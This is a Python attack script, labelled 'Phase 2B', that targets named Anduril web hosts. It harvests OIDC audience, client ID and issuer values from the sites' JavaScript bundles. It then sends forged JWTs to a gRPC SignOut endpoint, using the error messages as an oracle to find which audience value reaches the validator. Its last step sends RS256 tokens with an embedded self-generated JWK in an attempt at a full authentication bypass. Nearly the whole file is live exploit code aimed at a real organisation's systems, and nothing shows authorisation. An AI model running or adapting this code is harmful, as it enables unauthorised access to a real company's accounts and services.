#!/usr/bin/env python3
"""
PHASE 2B — JS Bundle aud/clientId/issuer extraction
Fetches the main JS bundles from catalog and sandboxes developer portal,
extracts OIDC configuration values (audience, clientId, issuer, Okta patterns).

Key target: the `aud` claim value that routes go-jose through PATH A (OIDC validator)
instead of PATH B (HS256 catch-all). Finding this unlocks Chain 5 (JWK injection).

Also using the go-jose oracle confirmed in Phase 1 (SignOut accepts Authorization header
and returns specific errors for invalid tokens) to test candidate aud values live.
"""
import re, json, struct, time, sys
import requests

requests.packages.urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

# ─── helpers ─────────────────────────────────────────────────────────────────
def _vi(v):
    r = b""
    while True:
        b = v & 0x7F; v >>= 7
        r += bytes([b | 0x80]) if v else bytes([b])
        if not v: break
    return r

def grpc_frame(b):
    return b"\x00" + struct.pack(">I", len(b)) + b

def oracle_test(token_str, label):
    """
    Test a JWT token string against the SignOut go-jose oracle on catalog.
    Returns the grpc-message error, which reveals whether go-jose accepted
    the structure and attempted verification (→ aud matched the OIDC path).
    
    Error map:
      "token is not a valid JWT"           → structural issue, ignored by OIDC path
      "error in cryptographic primitive"   → aud/alg/kid routing worked, sig invalid
      "id_token did not match any known"   → token reached OIDC validator but aud not matched
      grpc-status:0                        → token fully accepted (CRITICAL)
    """
    r = requests.post(
        "https://catalog.anduril.com/anduril.auth.v2.Tokens/SignOut",
        data=grpc_frame(b""),
        headers={
            "content-type": "application/grpc-web+proto",
            "x-grpc-web": "1",
            "Authorization": f"Bearer {token_str}"
        },
        verify=False, timeout=10
    )
    status = r.headers.get("grpc-status", "?")
    msg = r.headers.get("grpc-message", "")
    # Trailer may carry status
    if status == "?" and r.content:
        try:
            raw = r.content; i = 0
            while i < len(raw):
                if i + 5 > len(raw): break
                ft = raw[i]; fl = struct.unpack(">I", raw[i+1:i+5])[0]
                fb = raw[i+5:i+5+fl]; i += 5 + fl
                if ft == 0x80:
                    for line in fb.decode("utf-8", "replace").split("\r\n"):
                        if line.startswith("grpc-status:"):
                            status = line.split(":", 1)[1].strip()
                        elif line.startswith("grpc-message:"):
                            msg = line.split(":", 1)[1].strip()
                            import urllib.parse; msg = urllib.parse.unquote(msg)
        except Exception:
            pass
    flag = "  *** grpc-status=0 — STOP! ***" if status == "0" else ""
    print(f"  ORACLE [{label:50s}] grpc={status} | {msg[:100]}{flag}")
    if status == "0":
        print(f"    FULL RESPONSE: headers={dict(r.headers)} body={r.content.hex()}")
        sys.stdout.flush()
    time.sleep(0.3)
    return status, msg

def fetch_page(url, ua=UA):
    S = requests.Session(); S.verify = False
    S.headers.update({"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                       "Accept-Language": "en-US,en;q=0.9"})
    try:
        r = S.get(url, timeout=20, allow_redirects=True)
        print(f"  GET {url} → HTTP {r.status_code} ({len(r.text)} chars)")
        return r.text, r
    except Exception as e:
        print(f"  GET {url} → ERROR: {e}")
        return "", None

def fetch_js(url, ua=UA):
    S = requests.Session(); S.verify = False
    S.headers.update({"User-Agent": ua, "Accept": "*/*", "Referer": url.rsplit("/", 1)[0] + "/"})
    try:
        r = S.get(url, timeout=30)
        print(f"  JS {url} → HTTP {r.status_code} ({len(r.text)} chars)")
        return r.text
    except Exception as e:
        print(f"  JS {url} → ERROR: {e}")
        return ""

OIDC_PATTERNS = [
    # Audience / aud
    (r'audience\s*[=:]\s*["\']([^"\']+)["\']', "audience"),
    (r'"aud"\s*:\s*"([^"]+)"', 'aud (JSON)'),
    (r"'aud'\s*:\s*'([^']+)'", 'aud (single)'),
    (r'aud:\s*["\']([^"\']+)["\']', 'aud (bare)'),
    # Client IDs
    (r'clientId\s*[=:]\s*["\']([^"\']+)["\']', 'clientId'),
    (r'client_id\s*[=:]\s*["\']([^"\']+)["\']', 'client_id'),
    (r'clientID\s*[=:]\s*["\']([^"\']+)["\']', 'clientID'),
    # Issuer / authority
    (r'issuer\s*[=:]\s*["\']([^"\']+)["\']', 'issuer'),
    (r'authority\s*[=:]\s*["\']([^"\']+)["\']', 'authority'),
    (r'authServer\s*[=:]\s*["\']([^"\']+)["\']', 'authServer'),
    # Okta-specific
    (r'(https?://[a-zA-Z0-9.-]*okta\.com[^"\'<>\s]*)', 'okta_url'),
    (r'(https?://[a-zA-Z0-9.-]*auth0\.com[^"\'<>\s]*)', 'auth0_url'),
    (r'andurilext\.okta\.com[^"\']*["\']([^"\']+)', 'andurilext_okta_path'),
    # API audience patterns
    (r'(api://[a-zA-Z0-9._/-]+)', 'api_audience'),
    # OpenID connect discovery
    (r'(https?://[^"\'<>\s]+/\.well-known/openid-configuration)', 'oidc_discovery'),
    # Scope strings
    (r'scope\s*[=:]\s*["\']([^"\']{10,100})["\']', 'scope'),
    # Login domain
    (r'(https?://login\.[a-zA-Z0-9.-]+\.[a-zA-Z]+[^"\'<>\s]*)', 'login_url'),
    # Generic config objects that look like OIDC config
    (r'"domain"\s*:\s*"([^"]+anduril[^"]*)"', 'domain_anduril'),
    (r'"domain"\s*:\s*"([^"]+auth0[^"]*)"', 'domain_auth0'),
    (r'"domain"\s*:\s*"([^"]+okta[^"]*)"', 'domain_okta'),
]

def extract_oidc_values(content, source_label):
    found = {}
    for pattern, name in OIDC_PATTERNS:
        matches = re.findall(pattern, content)
        if matches:
            unique = list(dict.fromkeys(matches))  # deduplicate preserving order
            found[name] = unique
            for m in unique[:5]:
                print(f"  [{source_label}] {name}: {m}")
    return found

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 1: Fetch main pages and extract JS bundle URLs
# ═══════════════════════════════════════════════════════════════════════════════
print("=" * 70)
print("  STEP 1: Fetch main pages — discover JS bundle URLs")
print("=" * 70)
print()

targets = [
    "https://catalog.anduril.com",
    "https://catalog.anduril.com/login",
    "https://sandboxes.developer.anduril.com",
    "https://sandboxes.developer.anduril.com/login",
    "https://sandboxes.developer.anduril.com/auth/login",
]

js_urls = set()
all_oidc_values = {}

for url in targets:
    print(f"  -- {url} --")
    html, resp = fetch_page(url)
    if not html:
        continue
    
    # Extract inline OIDC values first
    inline = extract_oidc_values(html, url.split("//")[1][:30])
    all_oidc_values.update(inline)
    
    # Find all script src tags
    scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html)
    for s in scripts:
        if s.startswith("http"):
            js_urls.add(s)
        elif s.startswith("/"):
            base = "/".join(url.split("/")[:3])
            js_urls.add(base + s)
        print(f"    Script: {s}")
    
    # Also look for inline <script> blocks with config
    inline_blocks = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
    for block in inline_blocks:
        if any(kw in block.lower() for kw in ["aud", "client", "okta", "auth0", "issuer", "domain"]):
            extracted = extract_oidc_values(block, "inline_script")
            all_oidc_values.update(extracted)
    
    print()

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 2: Fetch and analyze known JS bundles
# ═══════════════════════════════════════════════════════════════════════════════
print("=" * 70)
print("  STEP 2: Fetch and analyze JS bundles")
print("=" * 70)
print()

# Known bundles from prior research
known_bundles = [
    "https://sandboxes.developer.anduril.com/static/js/andurilapis-BLeYin38.js",
    "https://sandboxes.developer.anduril.com/static/js/andurilapis_bundle.js",
    "https://catalog.anduril.com/static/js/andurilapis-BLeYin38.js",
    "https://catalog.anduril.com/static/js/andurilapis_bundle.js",
]

# Add any discovered URLs
for url in js_urls:
    if any(kw in url for kw in ["anduril", "bundle", "main", "app", "auth", "vendor"]):
        known_bundles.append(url)

seen_bundles = set()
for bundle_url in known_bundles:
    if bundle_url in seen_bundles:
        continue
    seen_bundles.add(bundle_url)
    
    print(f"  Fetching: {bundle_url}")
    content = fetch_js(bundle_url)
    if not content:
        continue
    
    # Save to disk for deeper analysis
    filename = "_bundle_" + re.sub(r'[^a-zA-Z0-9]', '_', bundle_url.split("/")[-1])[:50] + ".js"
    with open(filename, "w", encoding="utf-8", errors="replace") as fp:
        fp.write(content)
    print(f"    Saved: {filename}")
    
    # Extract OIDC values
    bundle_values = extract_oidc_values(content, bundle_url.split("/")[-1][:40])
    all_oidc_values.update(bundle_values)
    
    print()

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 3: Discover additional JS bundles from HTML
# ═══════════════════════════════════════════════════════════════════════════════
print("=" * 70)
print("  STEP 3: Additional bundle discovery")
print("=" * 70)
print()

# Fetch all discovered script URLs and analyze them
for js_url in list(js_urls)[:20]:  # Cap at 20 to avoid flooding
    if js_url in seen_bundles:
        continue
    seen_bundles.add(js_url)
    
    content = fetch_js(js_url)
    if not content or len(content) < 500:
        continue
    
    bundle_values = extract_oidc_values(content, js_url.split("/")[-1][:40])
    if bundle_values:
        all_oidc_values.update(bundle_values)
    
    time.sleep(0.2)

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 4: Collect all candidate aud values and test against go-jose oracle
# ═══════════════════════════════════════════════════════════════════════════════
print()
print("=" * 70)
print("  STEP 4: go-jose oracle test — candidate aud values")
print("=" * 70)
print()

# Collect all unique candidate aud/issuer/clientId values from extraction
aud_candidates = set()

# From extraction results
for key in ["audience", "aud (JSON)", "aud (bare)", "aud (single)", "api_audience", "issuer",
            "authority", "clientId", "client_id"]:
    for v in all_oidc_values.get(key, []):
        if len(v) > 3:
            aud_candidates.add(v)

# From Okta URLs — derive audience from discovered URLs
for okta_url in all_oidc_values.get("okta_url", []):
    aud_candidates.add(okta_url)
    # Also add the oauth2/default suffix variation
    if "/oauth2/" not in okta_url:
        aud_candidates.add(okta_url.rstrip("/") + "/oauth2/default")

# Add hardcoded high-confidence candidates based on known Okta tenant
BASE_CANDIDATES = [
    "api://default",
    "api://anduril",
    "api://lattice",
    "https://andurilext.okta.com",
    "https://andurilext.okta.com/oauth2/default",
    "https://andurilext.okta.com/oauth2/v1",
    "https://anduril.okta.com",
    "https://anduril.okta.com/oauth2/default",
    "https://login.developer.anduril.com",
    "https://login.developer.anduril.com/oauth2/default",
    "https://catalog.anduril.com",
    "https://sandboxes.developer.anduril.com",
    "https://anduril.us.auth0.com/",
    "https://anduril.us.auth0.com/api/v2/",
    "anduril",
    "lattice",
    "catalog",
]
for c in BASE_CANDIDATES:
    aud_candidates.add(c)

print(f"  Testing {len(aud_candidates)} aud candidates against go-jose oracle...")
print()

# Build a minimal fake 3-part JWT with each aud candidate
# We'll use HS256 with empty secret — go-jose will fail but the error message
# will tell us whether the aud matched an OIDC provider config
import base64 as b64
import hmac, hashlib

def make_test_jwt(aud, iss="https://andurilext.okta.com/oauth2/default"):
    """Build a fake JWT (invalid sig) to test against go-jose oracle."""
    header = b64.urlsafe_b64encode(
        json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    payload = b64.urlsafe_b64encode(
        json.dumps({
            "sub": "probe@anduril.com",
            "iss": iss,
            "aud": aud,
            "iat": 1700000000,
            "exp": 9999999999,
        }).encode()
    ).rstrip(b"=").decode()
    # Invalid signature
    sig = b64.urlsafe_b64encode(b"fake_sig_probe_AAAA").rstrip(b"=").decode()
    return f"{header}.{payload}.{sig}"

# Oracle error signatures:
# "id_token did not match any known OIDC idp" → aud not configured as OIDC provider
# "error in cryptographic primitive"          → aud matched → go-jose trying to verify!
# "token is expired"                          → aud matched AND sig matched (very unlikely)
# grpc-status:0                               → FULL BYPASS

for aud in sorted(aud_candidates):
    token = make_test_jwt(aud)
    status, msg = oracle_test(token, f"aud='{aud[:50]}'")
    # Flag anything that deviates from "did not match"
    if "did not match" not in msg and status != "0":
        print(f"    *** DEVIATION FROM BASELINE: aud='{aud}' → {msg}")

print()

# ─── Also test with RS256 + embedded JWK (the actual injection payload) ───────
print("=" * 70)
print("  STEP 4b: RS256 + embedded JWK test for each promising aud")
print("=" * 70)
print()

try:
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    import struct as st

    priv_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub_key = priv_key.public_key()
    pub_nums = pub_key.public_numbers()

    def int_to_b64u(n):
        raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
        return b64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    jwk_pub = {
        "kty": "RSA", "use": "sig", "alg": "RS256",
        "kid": "probe-key-1",
        "n": int_to_b64u(pub_nums.n),
        "e": int_to_b64u(pub_nums.e)
    }

    priv_pem = priv_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    )

    try:
        import jwt as PyJWT
        HAS_PYJWT = True
    except ImportError:
        HAS_PYJWT = False
        print("  PyJWT not installed — skipping RS256 JWK tests")

    if HAS_PYJWT:
        for aud in sorted(aud_candidates):
            hdr = {"alg": "RS256", "kid": "probe-key-1", "jwk": jwk_pub}
            payload_d = {
                "sub": "probe@anduril.com",
                "iss": "https://andurilext.okta.com/oauth2/default",
                "aud": aud,
                "iat": 1700000000,
                "exp": 9999999999,
            }
            try:
                token = PyJWT.encode(payload_d, priv_pem, algorithm="RS256", headers=hdr)
                status, msg = oracle_test(token, f"RS256+JWK aud='{aud[:45]}'")
                if "did not match" not in msg and status != "0":
                    print(f"    *** RS256 JWK HIT: aud='{aud}' → grpc={status} msg={msg}")
                    if status == "0":
                        print("  !!! CRITICAL: JWK INJECTION SUCCEEDED — FULL AUTH BYPASS !!!")
                        sys.exit(0)
            except Exception as e:
                print(f"  RS256 build error: {e}")
            time.sleep(0.3)

except ImportError as e:
    print(f"  Cryptography not available: {e}")

print()
print("=" * 70)
print("  PHASE 2B COMPLETE")
print()
print("  Key: look for any aud candidate that returns")
print("    'error in cryptographic primitive' instead of 'did not match any known'")
print("  That aud value is the unlock for full JWK injection.")
print("=" * 70)
